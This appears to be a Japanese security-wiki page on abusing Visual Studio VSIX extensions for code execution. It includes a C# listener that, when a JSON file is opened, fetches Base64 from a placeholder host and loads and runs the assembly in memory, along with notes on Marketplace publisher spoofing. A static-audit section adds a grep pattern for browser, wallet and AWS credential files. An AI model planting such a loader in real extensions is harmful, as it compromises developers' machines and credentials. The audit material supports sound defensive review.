# Visual Studio VSIX Extension の悪用

{{#include ../banners/hacktricks-training.md}}

Visual Studio extension を使うと、日常的なエディター操作を、ログオン中のユーザーの権限でのコード実行につなげられます。悪意のある VSIX、正規の発行元を装ったもの、または侵害された extension の更新は、通常のインストール経路を通じてユーザーに届く可能性があります。管理者の確認を求めるインストールは、ユーザーの同意を伴うインストール経路であり、自動的な権限昇格ではありません。<sup>[[1]](#references)</sup>

## 実行モデル

従来の VSSDK extension は、一般的に `devenv.exe` 内で実行されます。新しい `VisualStudio.Extensibility` モデルでは、主に最新の .NET extension をプロセス外で実行します。Visual Studio は専用の `Microsoft.ServiceHub.Host.Extensibility` プロセスに呼び出しを仲介するため、IDE の安定性は向上しますが、ユーザーの Windows 権限から extension が**隔離されるわけではありません**。実行ファイル名には、`ServiceHub.Host.Extensibility.arm64.exe` のようにアーキテクチャのサフィックスが含まれる場合があります。<sup>[[1]](#references)[[2]](#references)</sup>

### 通常のエディター操作をトリガーにする

目立つメニューコマンドだけを提供するのではなく、extension は `ITextViewOpenClosedListener` を実装できます。`TextViewOpenedAsync` コールバックは一致するドキュメントに対して呼び出され、`TextViewExtensionConfiguration.AppliesTo` で JSON などの一般的な種類に対してのみ有効化するよう制限できます。実際の formatter や linter が宣伝どおりの処理を行う一方で、ファイルを開いたときに別のアクションを副作用として実行することも可能です。<sup>[[1]](#references)[[3]](#references)</sup>

以下の簡略化したパターンでは、重要な実行ポイントを示しています。説明を明確にするため、正規の formatter とエラー処理は省略しています。<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>イベントをトリガーとするメモリ内 managed assembly loader</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

このチェーンはBase64テキストをダウンロードし、アセンブリのバイト列にデコードしてから、collectibleな`AssemblyLoadContext`を介して`MemoryStream`から読み込みます。リフレクションで取得した`EntryPoint`を、パラメーターなし、または`string[]`を指定して呼び出し、非同期のエントリポイントはawaitしてからコンテキストをアンロードします。第2ステージはディスクに書き込まれませんが、VSIXとプライマリ拡張DLLはディスク上に残ります。Base64には真正性も機密性もなく、HTTPを使うと経路上の攻撃者がレスポンスを置き換えることもできます。<sup>[[1]](#references)</sup>

運用上のバリエーションとして、ステージングに失敗しても宣伝された機能が継続するよう、すべての例外を抑制する方法や、編集後にトリガーされるよう`ITextViewChangedListener`を使う方法があります。コードは拡張ホスト内で実行され、そのユーザーが利用できるマネージドAPI、P/Invoke、ファイル、認証情報、子プロセスを使用できます。<sup>[[1]](#references)</sup>

ネイティブプラグインの自動読み込みを利用する、関連するエディター固有の実行サーフェスについては、以下を参照してください。

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplaceと配布経路の信頼を悪用する

VSIXは、直接共有されたファイルやフィッシングされたファイル、Web Marketplace、またはVisual Studioに組み込まれたMarketplaceブラウザー経由で届くことがあります。主に一意性と予約語リストだけを適用するPublisher登録では、視覚的に紛らわしいPublisher IDが許される場合があります。信頼済みのPublisherや拡張機能を侵害する方法は、既にインストール済みのユーザーベースを引き継げるため、さらに効果的です。MarketplaceからインストールするとVisual Studio Installerが起動し、ダウンロードしたVSIXは一時的に`%LOCALAPPDATA%\Temp`に置かれます。`payload.vsix`も正規の用途で使われるため、ファイル名だけでは不審な兆候とは言えません。<sup>[[1]](#references)</sup>

MDSecは、拡張機能を直接インストールするVisual StudioのURLプロトコルを特定できませんでした。オペレーターには、ユーザーにVSIXをインストールして信頼してもらうか、既存拡張機能の配布経路を侵害する必要があります。`AllUsers`パッケージはVisual Studioのインストールフォルダーにインストールされ、昇格を求める場合がありますが、これは通常の同意を伴うインストーラーの動作であり、自動的にadministratorやSYSTEM権限を得る経路ではありません。<sup>[[1]](#references)[[4]](#references)</sup>

### 大規模な静的監査

VSIXパッケージは通常ZIPコンテナーであるため、安全なMarketplaceレビューのパイプラインでは、拡張機能のコードを読み込まずにパッケージを列挙・展開し、マニフェストを解析して実行可能なサーフェスを特定し、`ilspycmd`でマネージドアセンブリを逆コンパイルできます。一般的な同梱依存関係を除外したうえで、拡張機能が所有するアセンブリを優先し、認証情報ストアに関する文字列を、ファイル読み取りとネットワーク送信、エンコードと送信、ダウンロードと実行、Credential Managerとネットワークアクセス、スクリーンショットと送信といった振る舞いのクラスターと照合します。<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

また、すべての実行面が managed code であると決めつけず、native DLL、MSBuild targets、スクリプト、T4 templates、インストーラーのペイロードも調査してください。不審な挙動は、マニフェストに記載された目的と照らし合わせてください。telemetry や正規の updater も、データ窃取やステージングに似た動作をすることがあります。静的解析だけでは、パックされたコード、難読化されたコード、動的に解決されるコード、休眠状態のコードを見落とします。また、最新バージョンだけを調査すると、過去の悪意あるリリースを見落とします。<sup>[[1]](#references)</sup>

別の project-load 攻撃では、VSIX をインストールせずに悪意ある [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md) を実行できます。<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Visual Studio Extensions再考](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - VisualStudio.Extensibilityについて](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - VSIXパッケージの構成](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NETツール](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder Tunnel Campaign、イラクの重要インフラを標的に](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
